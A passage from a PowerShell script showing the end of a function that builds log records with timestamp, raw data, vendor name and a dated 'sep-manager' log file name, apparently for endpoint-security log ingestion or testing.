        $records += @{
            TimeGenerated = Get-IsoTs $ts
            RawData       = $rawPayload
            SourceVendor  = "EndpointVendor1"
            FileName      = "sep-manager-$($ts.ToString('yyyyMMdd')).log"
        }
    }
    return $records
}

